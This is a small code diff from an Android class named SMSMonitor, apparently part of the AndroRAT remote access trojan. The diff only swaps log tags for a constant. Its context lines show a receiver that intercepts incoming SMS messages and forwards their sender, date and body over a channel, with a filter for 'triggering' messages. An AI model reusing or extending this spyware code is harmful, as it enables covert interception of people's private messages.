@@ -36,14 +36,14 @@ public class SMSMonitor {
 	}
 
 	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
-
+		private static final String TAG = "AndroRAT";
 		private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 
 		@Override
 		public void onReceive(Context context, Intent intent) {
 
 			if (intent.getAction().equals(SMS_RECEIVED)) {
-				Log.i("SMSReceived", "onReceive sms !");
+				Log.i(TAG, "onReceive sms !");
 
 				Bundle bundle = intent.getExtras();
 				if (bundle != null) {
@@ -64,7 +64,7 @@ public class SMSMonitor {
 							ctx.handleData(channel, sms.build());
 						} else {
 							if (phoneNumberFilter.contains(phoneNumber)) {
-								Log.i("SMSReceived", "Message accepted as triggering message !");
+								Log.i(TAG, "Message accepted as triggering message !");
 								ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
 								ctx.handleData(channel, sms.build());
 							}
